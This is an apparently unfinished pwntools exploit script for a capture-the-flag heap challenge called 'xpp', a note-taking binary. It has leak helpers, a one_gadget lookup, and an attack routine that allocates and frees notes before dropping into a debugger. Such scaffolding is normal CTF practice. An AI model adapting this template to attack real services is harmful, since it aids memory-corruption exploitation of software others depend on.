# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './xpp'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Exit',num)

def add( text = 'a'):
    cmd(1)
    sla('Content:' , text)
    ru("Your key: ")
    key = int(p.recvline())
    return key

def edit(key , text = "a"):
    cmd(4)
    sla('Key: ' , key)
    sla('New note:' , text)

def show(key ):
    cmd(2)
    sla('Key: ' , key)

def delete(key ):
    cmd(3)
    sla('Key:' , key)


def attack():
    
    key = add("c"*0x80)
    key2 = add("a"*0x10)

    delete(key)
    # key1 = add("x")

    # lg('key1',key1)

    dbg()
    
    p.interactive()

attack()

'''
@File    :   xpp.py
@Time    :   2022/10/30 13:17:25
@Author  :   Niyah 
'''